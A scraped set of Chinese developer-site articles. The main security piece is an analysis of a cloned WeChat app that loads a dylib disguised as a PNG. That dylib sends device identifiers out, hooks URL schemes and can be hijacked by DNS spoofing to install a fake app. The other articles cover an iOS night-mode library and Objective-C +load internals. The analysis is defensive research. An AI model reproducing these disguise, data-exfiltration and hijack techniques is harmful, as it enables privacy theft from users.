<p>这部分的实现并不在这篇文章的讨论范围之内，如果，对这部分看兴趣，可以看一下仓库中的 <code>generator</code> 文件夹，其中包含了代码生成器的全部代码。</p>
<h2>小结</h2>
<p>如果你对 DKNightVersion 的使用有兴趣，可以查看仓库的 <a href=""https://github.com/Draveness/DKNightVersion"" rel=""nofollow noreferrer"">README</a> 文件，有人会说不要在项目中 ObjC runtime，我个人觉得是没有问题，<code>AFNetworking</code>、 <code>BlocksKit</code> 也使用方法调剂来改变原有方法的实现，不能因为它强大就不使用它；正相反，有时候，使用 runtime 才能优雅地解决问题。</p>
<blockquote><p>关注仓库，及时获得更新：<a href=""https://github.com/draveness/iOS-Source-Code-Analyze"" rel=""nofollow noreferrer"">iOS-Source-Code-Analyze</a><br>Follow: <a href=""https://github.com/Draveness"" rel=""nofollow noreferrer"">Draveness · Github</a></p></blockquote>

                ", 成熟的夜间模式解决方案,1531972031,390,1,313,1,1,https://segmentfault.com/a/1190000005056914
104,1,0,6,"
                    
<h2>序言</h2>
<p>微信作为手机上的第一大应用，有着上亿的用户。并且很多人都不只拥有一个微信帐号，有的微信账号是用于商业的，有的是用于私人的。可惜的是官方版的微信并不支持多开的功能，并且频繁更换微信账号也是一件非常麻烦的事，于是大家纷纷在寻找能够在手机上登陆多个微信账号的方法，相对于iOS，Android上早就有了很成熟的产品，比如360 OS的微信双开和LBE的双开大师就可以满足很多用户多开的需求。</p>
<p>但是在iOS上，因为苹果的安全机制，并没有任何知名的IT厂商推出微信多开的产品，反而是各种小公司的微信双开产品满天飞。但使用这些产品真的安全吗？今天我们就来看看这些产品的真面目。</p>
<h2>一、 “倍推微信分身”初探</h2>
<p>这次要分析的产品名字叫”倍推微信分身”，可以实现非越狱iOS上的微信多开。这个app的安装是通过itms-services，也就是企业证书的安装模式进行安装的。服务器是架在59os.com。可以看到除了微信分身以外，还有很多别的破解应用提供下载：<br><span class=""img-wrap""><img data-src=""/img/bVvlUH"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>app安装完后的图标和微信的一模一样，只是名字变成了“倍推微信分身”： <br><span class=""img-wrap""><img data-src=""/img/bVvlUI"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>下载完倍推微信分身，并登陆后，可以看到首页与原版微信并没有太大的变化，只是左上角多了一个VIP的标志：<br><span class=""img-wrap""><img data-src=""/img/bVvlUM"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>我们知道，根据苹果的系统机制，一台iOS设备上不允许存在多个Bundle ID一样的app。因此，我们猜测这个微信分身app是修改过Bundle ID的。于是我们查看一下Info.plist，果然Bundle ID已经做了修改：<br><span class=""img-wrap""><img data-src=""/img/bVvlUN"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>但是研究过iOS上微信分身的人一定知道，微信app在启动以及发送消息的时候会对Bundle ID做校验的，如果不是” com.tencent.xin”就会报错并退出。那么”倍推微信分身”是怎么做到的呢？经过分析，原来”倍推微信分身”是通过hook的手段，在app启动的时候对BundleID做了动态修改。至于怎么进行非越狱iOS上的hook可以参考我之前写的两篇文章：</p>
<p>【iOS冰与火之歌番外篇 - 在非越狱手机上进行AppHook】<br><a href=""http://drops.wooyun.org/papers/12803"" rel=""nofollow noreferrer"">http://drops.wooyun.org/papers/12803</a></p>
<p>【iOS冰与火之歌番外篇 -App Hook答疑以及iOS 9砸壳】<br><a href=""http://drops.wooyun.org/papers/13824"" rel=""nofollow noreferrer"">http://drops.wooyun.org/papers/13824</a></p>
<p>于是我们对”倍推微信分身”的binary进行分析，发现这个binary在启动的时候会load一个伪装成一个png文件的第三方的dylib– wanpu.png：<br><span class=""img-wrap""><img data-src=""/img/bVvlUQ"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>用file指令可以看到这个伪png文件其实是一个包含了armv7和arm64的dylib：<br><span class=""img-wrap""><img data-src=""/img/bVvlUT"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>我们看到这个伪图片就像是一个寄生虫一样存在于微信app的体内，特别像dota里的Naix（俗称小狗）的终极技能 - 寄生，因此我们把这个高危样本称之为ImgNaix。<br><span class=""img-wrap""><img data-src=""/img/bVvlUV"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h2>二、wanpu.png分析</h2>
<p>用ida打开wanpu.png，可以看到这个dylib分别对BundleID，openURL和NewMainFrameViewController进行了hook：<br><span class=""img-wrap""><img data-src=""/img/bVvlUY"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>BundleID不用说，是为了让app在运行的时候改回”com.tencent.xin”。</p>
<p>NewMainFrameViewController的hook函数就是在微信主页上显示VIP的图片，以及传输一些非常隐私的用户数据（ssid, mac, imei等）到开发者自己的服务器上：<br><span class=""img-wrap""><img data-src=""/img/bVvlUW"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span><br><span class=""img-wrap""><img data-src=""/img/bVvlU2"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>OpenURL这个hook就很有意思了，这个函数本身是用来处理调用微信的URL Schemes的。看过我之前写过的《iOS URL Scheme 劫持》的文章的人一定知道这个”倍推微信分身”是有能力进行URL Scheme劫持的，如果在Info.plist里进行了声明，手机上所有使用的URL Schemes的应用都有可能被hijack。</p>
<p>除了这些hook以外，我们在竟然在”倍推微信分身”的逆向代码里，发现了Alipay的SDK！一个没想到，在”倍推微信分身”的帮助下，支付宝和微信支付终于走到了一起：<br><span class=""img-wrap""><img data-src=""/img/bVvlU5"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>因为捆绑了支付宝的SDK，”倍推微信分身”可以调用支付宝的快捷支付功能：<br><span class=""img-wrap""><img data-src=""/img/bVvlU7"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>通过网络抓包分析，我们可以看到”倍推微信分身”会发送一些服务收费的数据到手机上：<br><span class=""img-wrap""><img data-src=""/img/bVvlVa"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>经分析，”倍推微信分身”之所以加入支付宝sdk是为了对这个微信多开app进行收费。因为天下没有免费的午餐，软件开发者之所以制作腾讯的盗版软件”倍推微信分身”就是为了能够获取到一定的收入，所以才会接入支付SDK的。</p>
<h2>三、高危接口分析</h2>
<p>需要注意的是，”倍推微信分身”打开的url数据都是服务端可控的，并且没有进行加密，黑客可以使用MITM (Man-in-the-middle attack) 随意修改推送的内容，进行钓鱼攻击等操作。比如我通过DNS劫持就能够随意修改推送给用户的数据，以及诱导用户去下载我自己设定的企业app，简直和XcodeGhost一模一样（具体细节可以参考我之前发表的《你以为服务器关了这事就结束了？ - XcodeGhost截胡攻击和服务端的复现，以及UnityGhost预警》<a href=""http://drops.wooyun.org/papers/9024"" rel=""nofollow noreferrer"">http://drops.wooyun.org/papers/9024</a>）。</p>
<p>这里我们进行DNS劫持并修改了推送的内容，同时我们把URL替换成了另一个企业应用的下载plist：<br><span class=""img-wrap""><img data-src=""/img/bVvlVd"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>可以看到我们在启动”倍推微信分身”的时候弹出了更新对话框，还无法取消：<br><span class=""img-wrap""><img data-src=""/img/bVvlVl"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>点击后，”倍推微信分身”下载了我们替换后的企业应用，一个伪装成微信的假app：<br><span class=""img-wrap""><img data-src=""/img/bVvlVo"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>除此之外，在分析的过程中，我们还发现”倍推微信分身”app还存在非常多的高危接口，并且可以利用第三方服务器的控制进行远程调用：</p>
<p>(1). “倍推微信分身”app利用动态加载的方式调用了很多私有API。比如app使用了MobileCoreServices里的[LSApplicationWorkspace allInstalledApplications]来获取手机上安装的应用：<br><span class=""img-wrap""><img data-src=""/img/bVvlVA"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>比如app使用了SpringBoardServices的SBSLaunchApplicationWithIdentifier。这个API 可以在不需要urlscheme的情况下调起目标app：<br><span class=""img-wrap""><img data-src=""/img/bVvlVC"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>比如app加载了和应用安装有关的私有Framework MobileInstallation以及预留了通过URL Scheme安装企业app的接口：<br><span class=""img-wrap""><img data-src=""/img/bVvlVJ"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>(2). “倍推微信分身”app预留了一整套文件操作的高危接口，可以直接对微信app内的所有文件进行操作，这些文件包括好友列表，聊天记录，聊天图片等隐私信息。<br><span class=""img-wrap""><img data-src=""/img/bVvlVL"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>要知道在iOS上，聊天记录等信息都是完全没有加密的保存在MM.sqlite文件里的：<br><span class=""img-wrap""><img data-src=""/img/bVvlVN"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h2>总结</h2>
<p>虽然我们在样本分析的过程中除了获取用户隐私外，暂时没有捕获到恶意攻击的行为，但这个”倍推微信分身”预留了大量高危的接口（私有API，URL Scheme Hijack，文件操作接口等），并且破解者是可以随便修改客户端的内容，因此不要说推送任意广告和收费信息了，连窃取微信账号密码的可能性都有，简直就像一颗定时炸弹装在了手机上。这样的微信双开你还敢用吗？</p>
<p>从这个样本中，我们已经看到在非越狱iOS上的攻防技术已经变的非常成熟了，无论是病毒（XcodeGhost）还是破解软件（ImgNaix）都利用了很多苹果安全机制的弱点，并且随着研究iOS安全的人越来越多，会有更多的漏洞会被发现 (e.g., 利用XPC漏洞过App沙盒<a href=""http://drops.wooyun.org/papers/14170)"" rel=""nofollow noreferrer"">http://drops.wooyun.org/papers/14170)</a>。此外，iOS上的app不像Android，简直一点防护措施都没有，当遇到黑客攻击的时候几乎会瞬间沦陷。正如同我在MDCC 2015开发者大会上所讲的，XcodeGhost只是一个开始而已，随后会有越来越多的危机会出现在iOS上，请大家做好暴风雨来临前的准备吧！</p>
<p><strong>作者：蒸米@阿里移动安全，更多安全技术文章，请查看<a href=""https://jaq.alibaba.com/community/index"" rel=""nofollow noreferrer"">阿里聚安全博客</a></strong></p>

                ", 微信双开是定时炸弹？关于非越狱iOS上微信分身高危插件ImgNaix的分析,1531972032,571,1,564,1,1,https://segmentfault.com/a/1190000005050164
105,1,0,6,"
                    
<blockquote>
<p>关注仓库，及时获得更新：<a href=""https://github.com/draveness/iOS-Source-Code-Analyze"" rel=""nofollow noreferrer"">iOS-Source-Code-Analyze</a><br>Follow: <a href=""https://github.com/Draveness"" rel=""nofollow noreferrer"">Draveness · Github</a></p>
<p>因为 ObjC 的 runtime 只能在 Mac OS 下才能编译，所以文章中的代码都是在 Mac OS，也就是 <code>x86_64</code> 架构下运行的，对于在 arm64 中运行的代码会特别说明。</p>
</blockquote>
<h2>写在前面</h2>
<blockquote><p>文章的标题与其说是问各位读者，不如说是问笔者自己：<strong>我</strong>真的了解 <code>+ load</code> 方法么？</p></blockquote>
<p><code>+ load</code> 作为 Objective-C 中的一个方法，与其它方法有很大的不同。它只是一个<strong>在整个文件被加载到运行时，在 <code>main</code> 函数调用之前被 ObjC 运行时调用的钩子方法</strong>。其中关键字有这么几个：</p>
<ul>
<li><p>文件刚加载</p></li>
<li><p><code>main</code> 函数之前</p></li>
<li><p>钩子方法</p></li>
</ul>
<p>我在阅读 ObjC 源代码之前，曾经一度感觉自己对 <code>+ load</code> 方法的作用非常了解，直到看了源代码中的实现，才知道以前的以为，只是自己的以为罢了。</p>
<p>这篇文章会假设你知道：</p>
<ul>
<li><p>使用过 <code>+ load</code> 方法</p></li>
<li><p>知道 <code>+ load</code> 方法的调用顺序（文章中会简单介绍）</p></li>
</ul>
<p>在这篇文章中并不会用大篇幅介绍 <code>+ load</code> 方法的作用<del>其实也没几个作用</del>，关注点主要在以下两个问题上：</p>
<ul>
<li><p><code>+ load</code> 方法是如何被调用的</p></li>
<li><p><code>+ load</code> 方法为什么会有这种调用顺序</p></li>
</ul>
<h2>load 方法的调用栈</h2>
<p>首先来通过 <code>load</code> 方法的调用栈，分析一下它到底是如何被调用的。</p>
<p>下面是程序的全部代码：</p>
<pre><code class=""objectivec"">// main.m
#import &lt;Foundation/Foundation.h&gt;

@interface XXObject : NSObject @end

@implementation XXObject

+ (void)load {
    NSLog(@""XXObject load"");
}

@end

int main(int argc, const char * argv[]) {
    @autoreleasepool { }
    return 0;
}</code></pre>
<p>代码总共只实现了一个 <code>XXObject</code> 的 <code>+ load</code> 方法，主函数中也没有任何的东西：</p>
<p><span class=""img-wrap""><img data-src=""http://7xrlu3.com1.z0.glb.clouddn.com/2016-04-28-objc-load-print-load.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-load-print-load"" title=""objc-load-print-load""></span></p>
<p>虽然在主函数中什么方法都没有调用，但是运行之后，依然打印了 <code>XXObject load</code> 字符串，也就是说调用了 <code>+ load</code> 方法。</p>
<h3>使用符号断点</h3>
<p>使用 Xcode 添加一个符号断点 <code>+[XXObject load]</code>：</p>
<blockquote><p>注意这里 <code>+</code> 和 <code>[</code> 之间没有空格</p></blockquote>
<p><span class=""img-wrap""><img data-src=""http://7xrlu3.com1.z0.glb.clouddn.com/2016-04-28-objc-load-symbolic-breakpoint.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-load-symbolic-breakpoint"" title=""objc-load-symbolic-breakpoint""></span></p>
<blockquote><p>为什么要加一个符号断点呢？因为这样看起来比较高级。</p></blockquote>
<p>重新运行程序。这时，代码会停在 <code>NSLog(@""XXObject load"");</code> 这一行的实现上：</p>
<p><span class=""img-wrap""><img data-src=""http://7xrlu3.com1.z0.glb.clouddn.com/2016-04-28-objc-load-break-after-add-breakpoint.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-load-break-after-add-breakpoint"" title=""objc-load-break-after-add-breakpoint""></span></p>
<p>左侧的调用栈很清楚的告诉我们，哪些方法被调用了：</p>
<pre><code class=""objectivec"">0  +[XXObject load]
1  call_class_loads()
2  call_load_methods
3  load_images
4  dyld::notifySingle(dyld_image_states, ImageLoader const*)
11 _dyld_start</code></pre>
<blockquote>
<p><a href=""https://developer.apple.com/library/ios/documentation/System/Conceptual/ManPages_iPhoneOS/man3/dyld.3.html"" rel=""nofollow noreferrer"">dyld</a> 是 the dynamic link editor 的缩写，它是苹果的<em>动态链接器</em>。</p>
<p>在系统内核做好程序准备工作之后，交由 dyld 负责余下的工作。本文不会对其进行解释</p>
</blockquote>
<p>每当有新的镜像加载之后，都会执行 <code>3 load_images</code> 方法进行回调，这里的回调是在整个运行时初始化时 <code>_objc_init</code> 注册的（会在之后的文章中具体介绍）：</p>
<pre><code class=""objectivec"">dyld_register_image_state_change_handler(dyld_image_state_dependents_initialized, 0/*not batch*/, &amp;load_images);</code></pre>
<p>有新的镜像被加载到 runtime 时，调用 <code>load_images</code> 方法，并传入最新镜像的信息列表 <code>infoList</code>：</p>
<pre><code class=""objectivec"">const char *
load_images(enum dyld_image_states state, uint32_t infoCount,
            const struct dyld_image_info infoList[])
{
    bool found;

    found = false;
    for (uint32_t i = 0; i &lt; infoCount; i++) {
        if (hasLoadMethods((const headerType *)infoList[i].imageLoadAddress)) {
            found = true;
            break;
        }
    }
    if (!found) return nil;

    recursive_mutex_locker_t lock(loadMethodLock);

    {
        rwlock_writer_t lock2(runtimeLock);
        found = load_images_nolock(state, infoCount, infoList);
    }

    if (found) {
        call_load_methods();
    }

    return nil;
}</code></pre>
<h3>什么是镜像</h3>
<p>这里就会遇到一个问题：镜像到底是什么，我们用一个断点打印出所有加载的镜像：</p>
<p><span class=""img-wrap""><img data-src=""http://7xrlu3.com1.z0.glb.clouddn.com/2016-04-28-objc-load-print-image-info.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-load-print-image-info"" title=""objc-load-print-image-info""></span></p>
<p>从控制台输出的结果大概就是这样的，我们可以看到镜像并不是一个 Objective-C 的代码文件，它应该是一个 target 的编译产物。</p>
<pre><code class=""objectivec"">...
(const dyld_image_info) $52 = {
  imageLoadAddress = 0x00007fff8a144000
  imageFilePath = 0x00007fff8a144168 ""/System/Library/Frameworks/CoreServices.framework/Versions/A/CoreServices""
  imageFileModDate = 1452737802
}
(const dyld_image_info) $53 = {
  imageLoadAddress = 0x00007fff946d9000
  imageFilePath = 0x00007fff946d9480 ""/usr/lib/liblangid.dylib""
  imageFileModDate = 1452737618
}
(const dyld_image_info) $54 = {
  imageLoadAddress = 0x00007fff88016000
  imageFilePath = 0x00007fff88016d40 ""/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation""
  imageFileModDate = 1452737917
}
(const dyld_image_info) $55 = {
  imageLoadAddress = 0x0000000100000000
  imageFilePath = 0x00007fff5fbff8f0 ""/Users/apple/Library/Developer/Xcode/DerivedData/objc-dibgivkseuawonexgbqssmdszazo/Build/Products/Debug/debug-objc""
  imageFileModDate = 0
}</code></pre>
<p>这里面有很多的动态链接库，还有一些苹果为我们提供的框架，比如 Foundation、 CoreServices 等等，都是在这个 <code>load_images</code> 中加载进来的，而这些 <code>imageFilePath</code> 都是对应的<strong>二进制文件</strong>的地址。</p>
<p>但是如果进入最下面的这个目录，会发现它是一个<strong>可执行文件</strong>，它的运行结果与 Xcode 中的运行结果相同：</p>
<p><span class=""img-wrap""><img data-src=""http://7xrlu3.com1.z0.glb.clouddn.com/2016-04-28-objc-load-image-binary.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-load-image-binary"" title=""objc-load-image-binary""></span></p>
<h3>准备 + load 方法</h3>
<p>我们重新回到 <code>load_images</code> 方法，如果在扫描镜像的过程中发现了 <code>+ load</code> 符号：</p>
<pre><code class=""objectivec"">for (uint32_t i = 0; i &lt; infoCount; i++) {
    if (hasLoadMethods((const headerType *)infoList[i].imageLoadAddress)) {
        found = true;
        break;
    }
}</code></pre>
<p>就会进入 <code>load_images_nolock</code> 来查找 <code>load</code> 方法：</p>
<pre><code class=""objectivec"">bool load_images_nolock(enum dyld_image_states state,uint32_t infoCount,
                   const struct dyld_image_info infoList[])
{
    bool found = NO;
    uint32_t i;

    i = infoCount;
    while (i--) {
        const headerType *mhdr = (headerType*)infoList[i].imageLoadAddress;
        if (!hasLoadMethods(mhdr)) continue;

        prepare_load_methods(mhdr);
        found = YES;
    }

    return found;
}</code></pre>
<p>调用 <code>prepare_load_methods</code> 对 <code>load</code> 方法的调用进行准备（将需要调用 <code>load</code> 方法的类添加到一个列表中，后面的小节中会介绍）：</p>
<pre><code class=""objectivec"">void prepare_load_methods(const headerType *mhdr)
{
    size_t count, i;

    runtimeLock.assertWriting();

    classref_t *classlist = 
        _getObjc2NonlazyClassList(mhdr, &amp;count);
    for (i = 0; i &lt; count; i++) {
        schedule_class_load(remapClass(classlist[i]));
    }

    category_t **categorylist = _getObjc2NonlazyCategoryList(mhdr, &amp;count);
    for (i = 0; i &lt; count; i++) {
        category_t *cat = categorylist[i];
        Class cls = remapClass(cat-&gt;cls);
        if (!cls) continue;  // category for ignored weak-linked class
        realizeClass(cls);
        assert(cls-&gt;ISA()-&gt;isRealized());
        add_category_to_loadable_list(cat);
    }
}</code></pre>
<p>通过 <code>_getObjc2NonlazyClassList</code> 获取所有的类的列表之后，会通过 <code>remapClass</code> 获取类对应的指针，然后调用 <code>schedule_class_load</code> <strong>递归地安排当前类和没有调用 <code>+ load</code> 父类</strong>进入列表。</p>
<pre><code class=""objectivec"">static void schedule_class_load(Class cls)
{
    if (!cls) return;
    assert(cls-&gt;isRealized());

    if (cls-&gt;data()-&gt;flags &amp; RW_LOADED) return;

    schedule_class_load(cls-&gt;superclass);

    add_class_to_loadable_list(cls);
    cls-&gt;setInfo(RW_LOADED); 
}</code></pre>
<p>在执行 <code>add_class_to_loadable_list(cls)</code> 将当前类加入加载列表之前，会<strong>先把父类加入待加载的列表</strong>，保证父类在子类前调用 <code>load</code> 方法。</p>
<h3>调用 + load 方法</h3>
<p>在将镜像加载到运行时、对 <code>load</code> 方法的准备就绪之后，执行 <code>call_load_methods</code>，开始调用 <code>load</code> 方法：</p>
<pre><code class=""objectivec"">void call_load_methods(void)
{
    ...

    do {
        while (loadable_classes_used &gt; 0) {
            call_class_loads();
        }

        more_categories = call_category_loads();

    } while (loadable_classes_used &gt; 0  ||  more_categories);

    ...
}</code></pre>
<p>方法的调用流程大概是这样的：</p>
<p><span class=""img-wrap""><img data-src=""http://7xrlu3.com1.z0.glb.clouddn.com/2016-04-28-objc-load-diagram.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-load-diagra"" title=""objc-load-diagra""></span></p>
<p>其中 <code>call_class_loads</code> 会从一个待加载的类列表 <code>loadable_classes</code> 中寻找对应的类，然后找到 <code>@selector(load)</code> 的实现并执行。</p>
<pre><code class=""objectivec"">static void call_class_loads(void)
{
    int i;
    
    struct loadable_class *classes = loadable_classes;
    int used = loadable_classes_used;
    loadable_classes = nil;
    loadable_classes_allocated = 0;
    loadable_classes_used = 0;
    
    for (i = 0; i &lt; used; i++) {
        Class cls = classes[i].cls;
        load_method_t load_method = (load_method_t)classes[i].method;
        if (!cls) continue;

        (*load_method)(cls, SEL_load);
    }
    
    if (classes) free(classes);
}</code></pre>
<p>这行 <code>(*load_method)(cls, SEL_load)</code> 代码就会调用 <code>+[XXObject load]</code> 方法。</p>
<blockquote><p>我们会在下面介绍 <code>loadable_classes</code> 列表是如何管理的。</p></blockquote>
<p>到现在，我们回答了第一个问题：</p>
<p>Q：<strong><code>load</code> 方法是如何被调用的？</strong></p>
<p>A：当 Objective-C 运行时初始化的时候，会通过 <code>dyld_register_image_state_change_handler</code> 在每次有新的镜像加入<em>运行时</em>的时候，进行回调。执行 <code>load_images</code> 将所有包含 <code>load</code> 方法的文件加入列表 <code>loadable_classes</code> ，然后从这个列表中找到对应的 <code>load</code> 方法的实现，调用 <code>load</code> 方法。</p>
<h2>加载的管理</h2>
<p>ObjC 对于加载的管理，主要使用了两个列表，分别是 <code>loadable_classes</code> 和 <code>loadable_categories</code>。</p>
<p>方法的调用过程也分为两个部分，准备 <code>load</code> 方法和调用 <code>load</code> 方法，我更觉得这两个部分比较像生产者与消费者：</p>
<p><span class=""img-wrap""><img data-src=""http://7xrlu3.com1.z0.glb.clouddn.com/2016-04-28-objc-load-producer-consumer-diagram.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-load-producer-consumer-diagra"" title=""objc-load-producer-consumer-diagra""></span></p>
<p><code>add_class_to_loadable_list</code> 方法负责将类加入 <code>loadable_classes</code> 集合，而 <code>call_class_loads</code> 负责消费集合中的元素。</p>
<p>而对于分类来说，其模型也是类似的，只不过使用了另一个列表 <code>loadable_categories</code>。</p>
<h3>“生产” loadable_class</h3>
<p>在调用 <code>load_images -&gt; load_images_nolock -&gt; prepare_load_methods -&gt; schedule_class_load -&gt; add_class_to_loadable_list</code> 的时候会将未加载的类添加到 <code>loadable_classes</code> 数组中：</p>
<pre><code class=""objectivec"">void add_class_to_loadable_list(Class cls)
{
    IMP method;

    loadMethodLock.assertLocked();

    method = cls-&gt;getLoadMethod();
    if (!method) return;

    if (loadable_classes_used == loadable_classes_allocated) {
        loadable_classes_allocated = loadable_classes_allocated*2 + 16;
        loadable_classes = (struct loadable_class *)
            realloc(loadable_classes,
                              loadable_classes_allocated *
                              sizeof(struct loadable_class));
    }
    
    loadable_classes[loadable_classes_used].cls = cls;
    loadable_classes[loadable_classes_used].method = method;
    loadable_classes_used++;
}</code></pre>
<p>方法刚被调用时：</p>
<ol>
<li><p>会从 <code>class</code> 中获取 <code>load</code> 方法： <code>method = cls-&gt;getLoadMethod();</code></p></li>
<li><p>判断当前 <code>loadable_classes</code> 这个数组是否已经被全部占用了：<code>loadable_classes_used == loadable_classes_allocated</code></p></li>
<li><p>在当前数组的基础上扩大数组的大小：<code>realloc</code></p></li>
<li><p>把传入的 <code>class</code> 以及对应的方法的实现加到列表中</p></li>
</ol>
<p>另外一个用于保存分类的列表 <code>loadable_categories</code> 也有一个类似的方法 <code>add_category_to_loadable_list</code>。</p>
<pre><code class=""objectivec"">void add_category_to_loadable_list(Category cat)
{
    IMP method;

    loadMethodLock.assertLocked();

    method = _category_getLoadMethod(cat);

    if (!method) return;
    
    if (loadable_categories_used == loadable_categories_allocated) {
        loadable_categories_allocated = loadable_categories_allocated*2 + 16;
        loadable_categories = (struct loadable_category *)
            realloc(loadable_categories,
                              loadable_categories_allocated *
                              sizeof(struct loadable_category));
    }

    loadable_categories[loadable_categories_used].cat = cat;
    loadable_categories[loadable_categories_used].method = method;
    loadable_categories_used++;
}</code></pre>
<p>实现几乎与 <code>add_class_to_loadable_list</code> 完全相同。</p>
<p>到这里我们完成了对 <code>loadable_classes</code> 以及 <code>loadable_categories</code> 的提供，下面会开始消耗列表中的元素。</p>
<h3>“消费” loadable_class</h3>
<p>调用 <code>load</code> 方法的过程就是“消费” <code>loadable_classes</code> 的过程，<code>load_images -&gt; call_load_methods -&gt; call_class_loads</code> 会从 <code>loadable_classes</code> 中取出对应类和方法，执行 <code>load</code>。</p>
<pre><code class=""objectivec"">void call_load_methods(void)
{
    static bool loading = NO;
    bool more_categories;

    loadMethodLock.assertLocked();

    if (loading) return;
    loading = YES;

    void *pool = objc_autoreleasePoolPush();

    do {
        while (loadable_classes_used &gt; 0) {
            call_class_loads();
        }

        more_categories = call_category_loads();

    } while (loadable_classes_used &gt; 0  ||  more_categories);

    objc_autoreleasePoolPop(pool);

    loading = NO;
}</code></pre>
<p>上述方法对所有在 <code>loadable_classes</code> 以及 <code>loadable_categories</code> 中的类以及分类执行 <code>load</code> 方法。</p>
<pre><code class=""objectivec"">do {
    while (loadable_classes_used &gt; 0) {
        call_class_loads();
    }

    more_categories = call_category_loads();

} while (loadable_classes_used &gt; 0  ||  more_categories);</code></pre>
<p>调用顺序如下：</p>
<ol>
<li><p>不停调用类的 <code>+ load</code> 方法，直到 <code>loadable_classes</code> 为空</p></li>
<li><p>调用<strong>一次</strong> <code>call_category_loads</code> 加载分类</p></li>
<li><p>如果有 <code>loadable_classes</code> 或者更多的分类，继续调用 <code>load</code> 方法</p></li>
</ol>
<p>相比于类 <code>load</code> 方法的调用，分类中 <code>load</code> 方法的调用就有些复杂了：</p>
<pre><code class=""objectivec"">static bool call_category_loads(void)
{
    int i, shift;
    bool new_categories_added = NO;
    // 1. 获取当前可以加载的分类列表
    struct loadable_category *cats = loadable_categories;
    int used = loadable_categories_used;
    int allocated = loadable_categories_allocated;
    loadable_categories = nil;
    loadable_categories_allocated = 0;
    loadable_categories_used = 0;

    for (i = 0; i &lt; used; i++) {
        Category cat = cats[i].cat;
        load_method_t load_method = (load_method_t)cats[i].method;
        Class cls;
        if (!cat) continue;

        cls = _category_getClass(cat);
        if (cls  &amp;&amp;  cls-&gt;isLoadable()) {
            // 2. 如果当前类是可加载的 `cls  &amp;&amp;  cls-&gt;isLoadable()` 就会调用分类的 load 方法
            (*load_method)(cls, SEL_load);
            cats[i].cat = nil;
        }
    }

    // 3. 将所有加载过的分类移除 `loadable_categories` 列表
    shift = 0;
    for (i = 0; i &lt; used; i++) {
        if (cats[i].cat) {
            cats[i-shift] = cats[i];
        } else {
            shift++;
        }
    }
    used -= shift;

    // 4. 为 `loadable_categories` 重新分配内存，并重新设置它的值
    new_categories_added = (loadable_categories_used &gt; 0);
    for (i = 0; i &lt; loadable_categories_used; i++) {
        if (used == allocated) {
            allocated = allocated*2 + 16;
            cats = (struct loadable_category *)
                realloc(cats, allocated *
                                  sizeof(struct loadable_category));
        }
        cats[used++] = loadable_categories[i];
    }

    if (loadable_categories) free(loadable_categories);

    if (used) {
        loadable_categories = cats;
        loadable_categories_used = used;
        loadable_categories_allocated = allocated;
    } else {
        if (cats) free(cats);
        loadable_categories = nil;
        loadable_categories_used = 0;
        loadable_categories_allocated = 0;
    }

    return new_categories_added;
}</code></pre>
<p>这个方法有些长，我们来分步解释方法的作用：</p>
<ol>
<li><p>获取当前可以加载的分类列表</p></li>
<li><p>如果当前类是可加载的 <code>cls  &amp;&amp;  cls-&gt;isLoadable()</code> 就会调用分类的 <code>load</code> 方法</p></li>
<li><p>将所有加载过的分类移除 <code>loadable_categories</code> 列表</p></li>
<li><p>为 <code>loadable_categories</code> 重新分配内存，并重新设置它的值</p></li>
</ol>
<h2>调用的顺序</h2>
<p>你过去可能会听说过，对于 <code>load</code> 方法的调用顺序有两条规则：</p>
<ol>
<li><p>父类先于子类调用</p></li>
